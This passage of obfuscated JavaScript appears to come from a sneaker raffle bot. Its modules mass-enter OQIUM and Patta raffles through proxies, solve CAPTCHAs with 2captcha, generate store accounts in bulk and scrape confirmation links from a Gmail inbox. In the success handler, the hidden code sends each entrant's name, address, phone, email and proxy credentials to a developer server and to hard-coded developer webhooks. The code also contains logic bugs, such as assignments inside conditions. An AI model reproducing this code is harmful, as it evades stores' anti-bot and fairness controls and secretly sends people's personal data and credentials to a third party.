                                                _0x1ce4fb(_0x280c50[_0x3765d5], _0x467fcd);
                                            }
                                            _0xd37055(console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x467fcd['name'] + ']\x20Task\x20' + (_0x3765d5 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x19a41e != 'ver') {
                                                var _0x36bf0d = '' + _0x433461, _0x34a0b0 = await _0x11b6e5(_0x280c50[_0x3765d5], _0x467fcd, 'dev', !![], _0x36bf0d), _0x564427 = {};
                                                _0x564427['errorDEV'] = { 'embeds': [_0x34a0b0] }, _0x13d7e5(_0x280c50[_0x3765d5], _0x467fcd), _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x564427['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x564427['errorDEV']);
                                            }
                                            _0x59867b(console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x467fcd['name'] + ']\x20Task\x20' + (_0x3765d5 + 0x1) + ':\x20' + _0x433461)));
                                        }
                                    };
                                    try {
                                        _0x19a41e != 'ver' ? console['log'](_0x597cbe() + '\x20[' + _0x467fcd['name'] + ']\x20Task\x20' + (_0x3765d5 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3a9d5d['data']['attributes']['email']) : console['log'](_0x597cbe() + '\x20[' + _0x467fcd['name'] + ']\x20Task\x20' + (_0x3765d5 + 0x1) + ':\x20Fetching\x20Response'), _0x527126(_0x2a8560, callback);
                                    } catch (_0x3e5094) {
                                        console['log'](_0x597cbe() + '\x20Task\x20' + (_0x3765d5 + 0x1) + ':\x20' + _0x3e5094);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5cfa2f(_0x5b7169, 'ver', _0x4a7b54, _0x3bb20d, _0x39bb0b), console['log'](_0x597cbe() + '\x20[' + _0x4a7b54['name'] + ']\x20Sleeping\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                            } catch (_0x1bf8c2) {
                            }
                        }
                    }
                    try {
                        _0x5979c0();
                        while (!_0x5ee306) {
                            await _0x140651(0xbb8);
                        }
                        console['log']('Found\x20' + _0x2a2ed3['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x140651(0x9c4);
                    }
                    await _0x412a46(_0x45b073, _0x2a2ed3, _0x226eb1);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4e3a0d, _0x41c5cd, _0x1a9bec) {
                    var _0x3a38d4 = _0x41c5cd, _0x568527 = 0x0;
                    for (var _0x59c7fc = 0x0; _0x59c7fc < _0x41c5cd['length']; _0x59c7fc++) {
                        maxTasks = _0x342ed0['threads'];
                        while (_0x568527 >= maxTasks) {
                            await _0x140651(_0x342ed0['delay']);
                        }
                        async function _0x406983(_0x30e4fa, _0x81adf8, _0x36d56a, _0x5e6cf2) {
                            try {
                                await _0x58ea73(_0x81adf8, _0x5e6cf2);
                            } catch (_0x5e1060) {
                                throw new Error(_0x5e1060);
                            }
                            async function _0x433b9a(_0x177d39, _0x313b4e, _0x646dbc, _0x52b670, _0x299a9d) {
                                _0x568527++;
                                var _0x7266c, _0x2b47a0 = {}, _0x3098e8 = [], _0x49e284 = {}, _0x83d513 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x1aea2f = Math['round'](Math['random']() * (_0x83d513['length'] - 0x1));
                                !_0x52b670 && (_0x52b670 = {});
                                if (_0x313b4e != 'ver') {
                                    _0x1b4448(_0x646dbc['name'] + '\x20Task\x20' + (_0x177d39 + 0x1) + '\x20/\x20' + _0x52b670['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f), _0x3098e8 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x34b198
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x52b670[_0x177d39]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x342ed0['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x4e463c
                                            }
                                        ]
                                    }], _0x49e284 = { 'embeds': _0x3098e8 }, _0x2b47a0 = _0x646dbc['data'], _0x2b47a0['data']['attributes']['email'] = '' + _0x52b670[_0x177d39]['Email'];
                                    if (_0x52b670[_0x177d39]['Size'] == 'RANDOM') {
                                    }
                                    _0x2b47a0['data']['attributes']['properties']['$first_name'] = '' + _0x52b670[_0x177d39]['FirstName'], _0x2b47a0['data']['attributes']['properties']['$last_name'] = '' + _0x52b670[_0x177d39]['LastName'], _0x2b47a0['data']['attributes']['properties']['$address1'] = _0x52b670[_0x177d39]['Address1'] + '\x20' + _0x52b670[_0x177d39]['Address2'] + '\x20' + _0x52b670[_0x177d39]['HouseNumber'], _0x2b47a0['data']['attributes']['properties']['$zip'] = '' + _0x52b670[_0x177d39]['Zip'], _0x2b47a0['data']['attributes']['properties']['$city'] = '' + _0x52b670[_0x177d39]['City'], _0x2b47a0['data']['attributes']['properties']['$country'] = '' + _0x52b670[_0x177d39]['Country'], _0x52b670[_0x177d39]['Size'] == 'RANDOM' ? _0x2b47a0['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x83d513[_0x1aea2f] : _0x2b47a0['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x52b670[_0x177d39]['Size'], _0x2b47a0['data']['attributes']['properties']['$phone_number'] = '' + _0x52b670[_0x177d39]['Phone'], _0x2b47a0['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x52b670[_0x177d39]['Follower'];
                                }
                                if (_0x342ed0['useRandomProxy'] = ![])
                                    var _0x191dc4 = _0x299a9d[_0x177d39]['split'](':');
                                else
                                    var _0x219261 = Math['round'](Math['random']() * (_0x299a9d['length'] - 0x1)), _0x191dc4 = _0x299a9d[_0x219261]['split'](':');
                                var _0x119beb = {
                                    'jar': _0x931e8b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x646dbc['url'],
                                    'headers': _0x646dbc['headers'],
                                    'body': JSON['stringify'](_0x2b47a0),
                                    'proxy': 'http://' + _0x191dc4[0x2] + ':' + _0x191dc4[0x3] + '@' + _0x191dc4[0x0] + ':' + _0x191dc4[0x1]
                                };
                                return _0x313b4e != 'ver' && (_0x119beb['url'] = _0x646dbc['url'], _0x119beb['headers'] = _0x646dbc['headers']), _0x313b4e == 'ver' && (_0x119beb['method'] = 'GET'), new Promise(function (_0x378868, _0x149a2c) {
                                    callback = async (_0x18cb58, _0x3f3b10, _0x12aee9) => {
                                        if (!_0x18cb58 && _0x3f3b10['statusCode'] == 0xca || !_0x18cb58 && _0x3f3b10['statusCode'] == 0xc8) {
                                            if (_0x313b4e != 'ver') {
                                                var _0x34b19c = await _0x11b6e5(_0x52b670[_0x177d39], _0x646dbc, 'dev', ![]), _0xc6b1d4 = await _0x11b6e5(_0x52b670[_0x177d39], _0x646dbc, 'pub', ![]);
                                                const _0x50329d = {
                                                    'succesDEVMSG': { 'embeds': [_0x34b19c] },
                                                    'succesPUBMSG': { 'embeds': [_0xc6b1d4] }
                                                };
                                                let _0x264d8f = _0x52b670[_0x177d39];
                                                try {
                                                    prxdata = {
                                                        'username': _0x34b198['replace']('#', ''),
                                                        'module': _0x646dbc['name'],
                                                        'entrydata': JSON['stringify'](_0x264d8f),
                                                        'proxy': '' + _0x299a9d[_0x177d39]
                                                    };
                                                    var _0x341cf4 = JSON['stringify'](prxdata);
                                                    let _0x58a0bc = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x341cf4, _0x58a0bc);
                                                } catch (_0x2f24cb) {
                                                }
                                                if (_0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '')
                                                    try {
                                                        await _0x29bde2(_0x342ed0['webhook'], _0x50329d['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x50329d['succesDEVMSG']), await _0x140651(0xc8);
                                                try {
                                                    await _0x29bde2(_0x259650, _0x50329d['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1ce4fb(_0x52b670[_0x177d39], _0x646dbc);
                                            }
                                            _0x568527--, _0x378868(console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x646dbc['name'] + ']\x20Task\x20' + (_0x177d39 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x313b4e != 'ver') {
                                                var _0x2938c8 = '' + _0x18cb58, _0x8304c2 = await _0x11b6e5(_0x52b670[_0x177d39], _0x646dbc, 'dev', !![], _0x2938c8), _0x13ed6c = {};
                                                _0x13ed6c['errorDEV'] = { 'embeds': [_0x8304c2] }, _0x13d7e5(_0x52b670[_0x177d39], _0x646dbc), _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x13ed6c['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x13ed6c['errorDEV']);
                                            }
                                            _0x568527--, _0x149a2c(console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x646dbc['name'] + ']\x20Task\x20' + (_0x177d39 + 0x1) + ':\x20' + _0x18cb58)));
                                        }
                                    };
                                    try {
                                        _0x313b4e != 'ver' && console['log'](_0x597cbe() + '\x20[' + _0x646dbc['name'] + ']\x20Task\x20' + (_0x177d39 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2b47a0['data']['attributes']['email']), _0x527126(_0x119beb, callback);
                                    } catch (_0x32d558) {
                                        console['log'](_0x597cbe() + '\x20Task\x20' + (_0x177d39 + 0x1) + ':\x20' + _0x32d558);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x433b9a(_0x5e6cf2, 'nor', _0x30e4fa, _0x81adf8, _0x36d56a), console['log'](_0x597cbe() + '\x20[' + _0x30e4fa['name'] + ']\x20Sleeping\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                            } catch (_0x31dcdc) {
                            }
                        }
                        _0x406983(_0x4e3a0d, _0x3a38d4, _0x1a9bec, _0x59c7fc), await _0x140651(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x458abc, _0x1dff81, _0x44a79c) {
                    var _0x1dff81 = [], _0x1bb036 = ![];
                    async function _0x4fa70d() {
                        var _0x60cb72 = new _0x4d6860({
                            'user': _0x342ed0['masterMail'],
                            'password': _0x342ed0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2ff6ea(_0x445208) {
                            _0x60cb72['openBox']('INBOX', ![], _0x445208);
                        }
                        _0x60cb72['once']('ready', function () {
                            _0x2ff6ea(function (_0x11bb90, _0x3d688f) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x11bb90)
                                    throw _0x11bb90;
                                _0x60cb72['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x2c5b78, _0x196d79) {
                                    if (!_0x196d79 || !_0x196d79['length'])
                                        console['log'](_0x597cbe() + '\x20[' + _0x458abc['name'] + ']\x20No\x20mails\x20found'), _0x60cb72['end']();
                                    else {
                                        var _0x18a6ee = _0x60cb72['seq']['fetch'](_0x196d79, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x18a6ee['on']('message', function (_0x58a003, _0x564a13) {
                                            var _0x9d7b80 = '(#' + _0x564a13 + ')\x20';
                                            _0x58a003['on']('body', function (_0x106de0, _0x3b5ada) {
                                                _0x502d57(_0x106de0, (_0x3eeae3, _0x4a2fc2) => {
                                                    var _0x4ff8bc = _0x4a2fc2['text']['split']('(')[0x1], _0x29217b = _0x4ff8bc['split'](')')[0x0];
                                                    _0x1dff81['push'](_0x29217b);
                                                });
                                            }), _0x58a003['once']('end', function () {
                                            });
                                        }), _0x18a6ee['once']('error', function (_0xb8e777) {
                                            console['log']('Fetch\x20error:\x20' + _0xb8e777), _0x1bb036 = !![];
                                        }), _0x18a6ee['once']('end', function () {
                                            _0x60cb72['end'](), _0x1bb036 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x60cb72['once']('error', function (_0xd2d96) {
                            console['log'](_0xd2d96), _0x1bb036 = !![];
                        }), _0x60cb72['once']('end', async function () {
                            _0x1bb036 = !![];
                        }), _0x60cb72['connect']();
                    }
                    async function _0x411838(_0x19b1c2, _0x3a207a, _0xd45beb) {
                        for (var _0x5733c5 = 0x0; _0x5733c5 < _0x3a207a['length']; _0x5733c5++) {
                            async function _0xf03ed(_0x2f6664, _0x5efc52, _0x1e4dc6, _0x32953e, _0x2d0de7) {
                                var _0x2d15ac, _0x3473e7 = {}, _0x31e148 = [], _0x23e556 = {}, _0x47cb75 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x311223 = Math['round'](Math['random']() * (_0x47cb75['length'] - 0x1));
                                _0x32953e[_0x2f6664]['Size'] == 'RANDOM' && (_0x32953e[_0x2f6664]['Size'] = _0x47cb75[_0x311223]);
                                !_0x32953e && (_0x32953e = {});
                                if (_0x342ed0['useRandomProxy'] = ![])
                                    var _0x19948d = _0x2d0de7[_0x2f6664]['split'](':');
                                else
                                    var _0x234684 = Math['round'](Math['random']() * (_0x2d0de7['length'] - 0x1)), _0x19948d = _0x2d0de7[_0x234684]['split'](':');
                                var _0xb36ee9 = {
                                    'jar': _0x931e8b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1e4dc6['url'],
                                    'headers': _0x1e4dc6['headers'],
                                    'body': JSON['stringify'](_0x3473e7),
                                    'proxy': 'http://' + _0x19948d[0x2] + ':' + _0x19948d[0x3] + '@' + _0x19948d[0x0] + ':' + _0x19948d[0x1]
                                };
                                return _0x5efc52 == 'ver' && (_0xb36ee9['method'] = 'GET', _0xb36ee9['url'] = _0x32953e[_0x2f6664]), new Promise(function (_0x2298eb, _0x22c82a) {
                                    callback = async (_0x166a16, _0x59f9ee, _0x2ffb68) => {
                                        !_0x166a16 && _0x59f9ee['statusCode'] == 0xca || !_0x166a16 && _0x59f9ee['statusCode'] == 0xc8 ? _0x2298eb(console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x1e4dc6['name'] + ']\x20Task\x20' + (_0x2f6664 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x22c82a(console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1e4dc6['name'] + ']\x20Task\x20' + (_0x2f6664 + 0x1) + ':\x20' + _0x166a16)));
                                    };
                                    try {
                                        _0x5efc52 != 'ver' ? console['log'](_0x597cbe() + '\x20[' + _0x1e4dc6['name'] + ']\x20Task\x20' + (_0x2f6664 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3473e7['data']['attributes']['email']) : console['log'](_0x597cbe() + '\x20[' + _0x1e4dc6['name'] + ']\x20Task\x20' + (_0x2f6664 + 0x1) + ':\x20Fetching\x20Response'), _0x527126(_0xb36ee9, callback);
                                    } catch (_0xa170ab) {
                                        console['log'](_0x597cbe() + '\x20Task\x20' + (_0x2f6664 + 0x1) + ':\x20' + _0xa170ab);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0xf03ed(_0x5733c5, 'ver', _0x19b1c2, _0x3a207a, _0xd45beb), console['log'](_0x597cbe() + '\x20[' + _0x19b1c2['name'] + ']\x20Sleeping\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                            } catch (_0x45eda1) {
                                console['log'](_0x45eda1), await _0x140651(0x2710);
                            }
                        }
                    }
                    try {
                        _0x4fa70d();
                        while (!_0x1bb036) {
                            await _0x140651(0xfa0);
                        }
                        console['log']('Found\x20' + _0x1dff81['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x522d59) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x522d59), await _0x140651(0x2710);
                    }
                    try {
                        await _0x411838(_0x458abc, _0x1dff81, _0x44a79c);
                    } catch (_0x203b2a) {
                        console['log'](_0x203b2a), await _0x140651(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3bdc79, _0x207ed2, _0x5269f2) {
                    _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x342ed0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x20a13d = 0x0; _0x20a13d < _0x207ed2['length']; _0x20a13d++) {
                        var _0x47caa7 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x34b198
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x342ed0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4e463c
                                }
                            ]
                        }];
                        const _0x3a0d53 = { 'embeds': _0x47caa7 };
                        _0x1b4448(_0x3bdc79['name'] + '\x20Task\x20' + (_0x20a13d + 0x1) + '\x20/\x20' + _0x207ed2['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                        try {
                            await _0x58ea73(_0x207ed2, _0x20a13d);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5e898f = await _0x11b6e5(_0x207ed2[_0x20a13d], _0x3bdc79, 'acc', ![]);
                        const _0x145f6c = { 'succesDEVMSG': { 'embeds': [_0x5e898f] } };
                        if (_0x207ed2[_0x20a13d]['Email'] == '' || _0x207ed2[_0x20a13d]['FirstName'] == '' || _0x207ed2[_0x20a13d]['LastName'] == '') {
                            console['log'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0x20a13d + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x140651(0x7d0);
                            continue;
                        }
                        (_0x207ed2[_0x20a13d]['Password'] == '' || _0x207ed2[_0x20a13d] == undefined) && _0x207ed2[_0x20a13d]['Password'] == 'JRaffles23!';
                        if (_0x342ed0['useRandomProxy'] = ![])
                            var _0x54bc35 = _0x5269f2[_0x20a13d]['split'](':');
                        else
                            var _0x25eebd = Math['round'](Math['random']() * (_0x5269f2['length'] - 0x1)), _0x54bc35 = _0x5269f2[_0x25eebd]['split'](':');
                        var _0xf3febc;
                        try {
                            _0xf3febc = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x54bc35[0x0] + ':' + _0x54bc35[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xf3febc = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x54bc35[0x0] + ':' + _0x54bc35[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x481ccb = await _0xf3febc['newPage']();
                            await _0x481ccb['authenticate']({
                                'username': '' + _0x54bc35[0x2],
                                'password': '' + _0x54bc35[0x3]
                            }), console['log'](_0x597cbe() + '\x20[' + _0x3bdc79['name'] + ']\x20Task\x20' + (_0x20a13d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x481ccb['setRequestInterception'](!![]), _0x481ccb['on']('request', _0x160929 => {
                                _0x160929['resourceType']() === 'image' || _0x160929['resourceType']() === 'font' || _0x160929['resourceType']() === 'media' ? _0x160929['abort']() : _0x160929['continue']();
                            }), await _0x481ccb['goto']('https://patta.nl/account/register'), await _0x140651(0xbb8), await _0x481ccb['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x597cbe() + '\x20[' + _0x3bdc79['name'] + ']\x20Task\x20' + (_0x20a13d + 0x1) + '\x20:\x20Filling\x20information'), await _0x481ccb['type']('#RegisterForm-FirstName', '' + _0x207ed2[_0x20a13d]['FirstName']), await _0x140651(0x226), await _0x481ccb['type']('#RegisterForm-LastName', '' + _0x207ed2[_0x20a13d]['LastName']), await _0x140651(0x226), await _0x481ccb['type']('#RegisterForm-email', '' + _0x207ed2[_0x20a13d]['Email']), await _0x140651(0x226), await _0x481ccb['type']('#RegisterForm-password', '' + _0x207ed2[_0x20a13d]['Password']), await _0x140651(0x226), console['log'](_0x597cbe() + '\x20[' + _0x3bdc79['name'] + ']\x20Task\x20' + (_0x20a13d + 0x1) + '\x20:\x20Submitting..'), await _0x481ccb['$eval']('#RegisterForm', _0x57dcef => _0x57dcef['submit']()), await _0x140651(0x1f40);
                            try {
                                await _0x481ccb['waitForSelector']('.home-page-grid__collection'), await _0x140651(0x1f4), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x3bdc79['name'] + ']\x20Task\x20' + (_0x20a13d + 0x1) + '\x20:\x20Account\x20' + _0x207ed2[_0x20a13d]['Email'] + '\x20Generated!')), _0x7a56eb['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x207ed2[_0x20a13d]['Email'] + ',' + _0x207ed2[_0x20a13d]['Password']), console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x3bdc79['name'] + ']\x20Task\x20' + (_0x20a13d + 0x1) + '\x20:\x20Account\x20' + _0x207ed2[_0x20a13d]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x145f6c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x29bde2(_0x36741f, _0x145f6c['succesDEVMSG']);
                            } catch (_0x2c0d8e) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0x20a13d + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x2c0d8e));
                            }
                        } catch (_0x261754) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0x20a13d + 0x1) + '\x20:\x20' + _0x261754));
                        } finally {
                            _0xf3febc && _0xf3febc['close'](), console['log']('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x147b29, _0x5a9fe0, _0x31acfb) {
                    _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x342ed0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5957e5 = 0x0; _0x5957e5 < _0x5a9fe0['length']; _0x5957e5++) {
                        var _0xa3cd2e;
                        if (_0x437108 != 'yes')
                            var _0x437108 = '', _0x308e65 = 0x0;
                        _0x1b4448(_0x147b29['name'] + '\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20/\x20' + _0x5a9fe0['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                        try {
                            await _0x58ea73(_0x5a9fe0, _0x5957e5);
                        } catch {
                            _0x437108 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5a9fe0[_0x5957e5]['Email'] == '' || _0x5a9fe0[_0x5957e5]['Password'] == '' || _0x5a9fe0[_0x5957e5]['FirstName'] == '' || _0x5a9fe0[_0x5957e5]['LastName'] == '') {
                            console['log'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x342ed0['useRandomProxy'] = ![])
                            var _0x49e458 = _0x31acfb[_0x5957e5]['split'](':');
                        else
                            var _0x2413ed = Math['round'](Math['random']() * (_0x31acfb['length'] - 0x1)), _0x49e458 = _0x31acfb[_0x2413ed]['split'](':');
                        var _0x18bc8e;
                        try {
                            _0x18bc8e = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x49e458[0x0] + ':' + _0x49e458[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x18bc8e = await _0x51ff47['launch']({
